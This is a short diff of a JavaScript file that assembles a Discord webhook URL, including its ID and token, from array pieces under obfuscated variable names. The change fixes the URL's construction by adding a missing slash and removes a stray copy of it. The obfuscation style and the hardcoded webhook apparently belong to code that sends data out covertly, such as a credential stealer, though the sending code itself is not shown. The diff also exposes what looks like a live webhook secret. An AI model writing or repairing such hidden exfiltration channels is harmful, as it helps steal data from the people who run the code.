@@ -1,10 +1,8 @@
 const _0x9a7b = [
   "https://discord.com/api/webhooks/",
-  "1512850312816365819",
+  "1512850312816365819/",
   "qRmBqbqt1_5yXrAX4DTZuTv-IGrf31X6fxF088xLdd9PVoFM6qifTDWbsBOLSak0DnHn"
 ].join("");
-
-https://discord.com/api/webhooks/1512850312816365819/qRmBqbqt1_5yXrAX4DTZuTv-IGrf31X6fxF088xLdd9PVoFM6qifTDWbsBOLSak0DnHn
 
 let _0x2f91 = false;
 let _0x71c0 = false;
